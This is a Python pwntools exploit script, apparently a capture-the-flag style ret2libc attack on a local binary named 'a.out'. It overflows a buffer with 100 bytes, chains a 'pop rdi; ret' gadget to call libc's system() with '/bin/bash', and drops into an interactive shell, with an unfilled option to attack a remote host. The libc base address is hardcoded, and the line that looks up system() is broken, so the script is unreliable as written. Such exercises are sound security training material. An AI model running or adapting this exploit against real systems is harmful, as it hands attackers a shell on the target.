from pwn import *
import sys

exe = ELF("./a.out")
context.binary = exe.path
HOST = ""
PORT = -1


def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    elif args.TRACE:
        r = process(["strace", "-o", "strace.out", exe.path])
    else:
        r = process([exe.path])
    return r


def main():
    r = conn()
    gdb.attach(r)
    rop = ROP(exe)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    OFFSET = 100
    libc.address = 0x00007ffff7dce000 

    r.recvuntil("input: ".encode())
    rop.raw("A" * OFFSET)
    rop.raw(0x0000000000401353) # pop rdi ; ret gadget
    rop.raw(next(libc.search(b'/bin/bash')))
    rop.raw(next(libc.symbols['system']))
    r.sendline((rop.chain()))
    r.interactive()

if __name__ == "__main__":
    main()
